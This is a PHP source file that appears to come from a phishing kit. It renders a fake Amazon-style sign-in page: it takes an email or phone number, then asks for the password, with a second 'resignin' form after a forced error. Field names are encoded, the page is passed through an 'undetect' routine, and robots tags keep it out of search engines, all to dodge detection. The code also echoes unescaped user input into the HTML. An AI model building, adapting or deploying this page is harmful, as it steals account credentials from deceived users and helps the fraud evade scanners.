<?php
require __DIR__ . '/../../function.php';
require $api->language();

$page = "Signin";
$api->check_cookie();

$api->session("glitch", true, $page);

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST[$api->encypt('username')])) {
        $username = $_POST[$api->encypt('username')];
        $_SESSION['username'] = $username;

        $regex_email = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/';
        $regex_phone = '/^\+?[1-9][0-9]{6,14}$/';
        
        if (preg_match($regex_email, $username) || preg_match($regex_phone, $username)) {
        } else {
            header("Location: /ap/signin?error=true");
            exit;
        }
    } else {
        header("Location: /ap/signin?error=true");
        exit;
    }      
}

$html = '
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern">
<head>
    <title dir="ltr">'.$api->text_encode($lang['login']['title']).'</title>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=yes">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
    <link rel="shortcut icon" href="'.$api->image_encode("assets/img/favicon.ico")['local'].'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/login-style.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-login.css").'">
    <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/style-cvf.css").'">
</head>
<body class="auth-no-skin ap-locale-en_US a-m-us a-aui_72554-c a-aui_a11y_2_750578-t2 a-aui_a11y_6_837773-t2 a-aui_a11y_sr_678508-t1 a-aui_amzn_img_959719-c a-aui_amzn_img_gate_959718-c a-aui_killswitch_csa_logger_372963-c a-aui_pci_risk_banner_210084-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c a-meter-animate">
    <div class="a-section a-padding-medium auth-workflow">
        <div class="a-section a-spacing-none auth-navbar">
            <div class="a-section a-spacing-medium a-text-center">
                <a class="a-link-nav-icon" href="#!">
                    <i class="a-icon a-icon-logo" role="img"></i>
                    ';
                    if ($_SESSION['countrycode'] == "jp") {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain-'.strtolower($_SESSION['countrycode']).'" role="img"></i>';
                    } else {
                        $html .= '<i class="a-icon a-icon-domain-'.strtolower($_SESSION['countrycode']).' a-icon-domain" role="img"></i>';
                    }
                    $html .= '
                </a> 
            </div>
        </div>
        <div id="authportal-center-section" class="a-section">
            <div id="authportal-main-section" class="a-section">
                <div class="a-section a-spacing-base auth-pagelet-container">
                    <div class="a-section">
                    ';
                    if (isset($_GET['error']) && $_GET['error'] == true) {
                    $html .= '
                        <div aria-live="assertive" id="auth-error-message-box" class="a-box a-alert a-alert-error auth-server-side-message-box a-spacing-base" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">'.$api->text_encode($lang['login']['titlealertsignin']).'</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-nostyle a-vertical a-spacing-none">
                                        <li>
                                            <span class="a-list-item">
                                                '.$api->text_encode($lang['login']['alertsignin']).'
                                            </span>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                        ';
                    }
                    $html .= '
                    </div>
                </div>
                <div class="a-section auth-pagelet-container">
                    <div class="a-section a-spacing-base">
                        <div class="a-section">
                            <div class="a-section">
                                <div class="a-box">
                                    <div class="a-box-inner a-padding-extra-large">
                                        <h1 class="a-spacing-small">
                                            '.$api->text_encode($lang['login']['signin']).'
                                        </h1>
                                        ';
                                        if (isset($_GET['error']) && $_GET['error'] == true) {
                                        $html .= '
                                        <div class="a-row a-spacing-base">
                                            <span id="auth-email-claim" dir="ltr">'.$_SESSION['username'].'</span>
                                            <a id="ap_change_login_claim" class="a-link-normal" href="/ap/signin?back=' . $_SESSION['username'] . '">
                                                '.$api->text_encode($lang['login']['change']).'
                                            </a>
                                        </div>
                                        <form method="post" action="/resignin" class="auth-validate-form auth-real-time-validation a-spacing-none" data-fwcim-id="LInHkaiV">
                                        <input type="hidden" name="'.$api->encypt("username").'" value="'.$_SESSION['username'].'" />
                                            <div class="a-section">
                                                <div class="a-section a-spacing-large">
                                                    <div class="a-row">
                                                        <div class="a-column a-span5">
                                                            <label for="password" class="a-form-label">
                                                                '.$api->text_encode($lang['login']['password']).'
                                                            </label>
                                                        </div>
                                                        <div class="a-column a-span7 a-text-right a-span-last">
                                                            <a id="auth-fpp-link-bottom" class="a-link-normal" href="#gp">
                                                                '.$api->text_encode($lang['login']['forgot']).'
                                                            </a>
                                                        </div>
                                                    </div>
                                                    <input type="password" id="password" name="'.$api->encypt("password").'" class="a-input-text a-span12 auth-autofocus auth-required-field" required="true">
                                                    <div id="inputErrorMsgPassword"></div>
                                                </div>
                                                <div class="a-section">
                                                    <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary auth-disable-button-on-submit">
                                                        <span class="a-button-inner">
                                                            <input id="btn_login" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce">
                                                            <span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                                                '.$api->text_encode($lang['login']['signin']).'
                                                            </span>
                                                        </span>
                                                    </span>
                                                </div>
                                            </div>
                                        </form>
                                        ';
                                        } else {
                                        $html .= '
                                        <div class="a-row a-spacing-base">
                                            <span id="auth-email-claim" dir="ltr">'.$username.'</span>
                                            <a id="ap_change_login_claim" class="a-link-normal" href="/ap/signin?back=' . $username . '">
                                                '.$api->text_encode($lang['login']['change']).'
                                            </a>
                                        </div>
                                        <form method="post" action="/signin" class="auth-validate-form a-spacing-none">
                                        <input type="hidden" name="'.$api->encypt("username").'" value="'.$username.'" />
                                            <div class="a-section a-spacing-large">
                                                <label for="password" class="a-form-label">
                                                    '.$api->text_encode($lang['login']['password']).'
                                                </label>
                                                <input type="password" id="password" name="'.$api->encypt("password").'" class="a-input-text a-span12" required="true">
                                                <div id="inputErrorMsgPassword"></div>
                                            </div>
                                            <div class="a-section">
                                                <span id="auth-signin-button" class="a-button a-button-span12 a-button-primary">
                                                    <span class="a-button-inner">
                                                        <input id="btn_login" class="a-button-input" type="submit" aria-labelledby="auth-signin-button-announce">
                                                        <span id="auth-signin-button-announce" class="a-button-text" aria-hidden="true">
                                                            '.$api->text_encode($lang['login']['signin']).'
                                                        </span>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                        ';
                                        }
                                        $html .= '
                                        <br>
                                        <div id="ap-signin-alternative-option-divider" class="a-section">
                                            <div class="a-divider a-divider-break">
                                                <h5 aria-level="5">'.$api->text_encode($lang['login']['or']).'</h5>
                                            </div>
                                        </div>
                                        <div id="auth-signin-via-passkey-section" data-keep-hidden="false" class="a-section">
                                            <span id="auth-signin-via-passkey-btn" class="a-button a-button-span12 a-button-base">
                                                <span class="a-button-inner">
                                                    <button id="continue" class="a-button-text" type="button">
                                                        '.$api->text_encode($lang['login']['passkey']).'
                                                    </button>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="right-2"></div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini">
                <span class="auth-footer-seperator"></span>
                <ul>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['conditions']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['privacy']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                    <li style="list-style-type: none; margin: 0; padding:0; display: inline-block;">
                        <a class="a-link-normal a-nowrap" rel="noopener" href="#gp">
                            '.$api->text_encode($lang['login']['help']).'
                        </a>
                        <span class="auth-footer-seperator"></span>
                    </li>
                </ul>
            </div>
            <div class="a-section a-spacing-none a-text-center"> 
                <span class="a-size-mini a-color-secondary">
                    '.$api->text_encode($lang['login']['copyright']).'
                </span>
            </div>
        </div>
    </div>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script>
        var passwordEmpty = '.json_encode($lang['login']['passwordEmpty']).';
        var passwordInvalid = '.json_encode($lang['login']['passwordInvalid']).';
    </script>
    <script src="'.$api->text_encode("../../assets/js/signin.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>